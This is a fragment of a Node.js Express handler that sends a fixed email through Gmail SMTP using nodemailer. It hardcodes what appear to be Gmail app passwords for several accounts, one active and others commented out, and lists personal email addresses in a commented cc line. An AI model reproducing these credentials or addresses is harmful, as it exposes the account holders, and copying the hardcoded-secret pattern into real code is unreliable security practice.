    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


export const send_email = async (req, res) => {
    const { text ,email} = req.body
    const rand =   Math.random().toString().substr(2, 6)

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        host: 'smtp.gmail.com',
        port: 587,
        secure: false,
        auth: {
            

               user: 'tonmoysamoi@gmail.com',
          pass:'theh cifb ffjc ogil',
            // user: 'ranaha199112@gmail.com',
            // pass:'jzpp ypxn ywtr niog',

            // user: 'tonmoysamoi@gmail.com',
            // pass:'jqtt atlb ilwr fzat',
        //   user: 'combddtana@gmail.com',
        //   pass:'zfhb vejz pdgm bbtw',
        },
      });
    
      const mailOptions = {
        from: {
          name: 'Test Email',
          address: 'tonmoysamoi@gmail.com',
        },
        to: email,
        // cc: ['rana.buddy@gmail.com','emonabdullah445@gmail.com','simonahmed00775@gmail.com'],
        subject: 'active ship management',
        text:"this email is from active ship management"
        // html:templete
      }
      
      try {
        const info = await transporter.sendMail(mailOptions);
      
       return res.status(200).json({success:'Email sent'});
      } catch (error) {
        console.log(error);
        return  res.status(500).json({error:error});
      }






}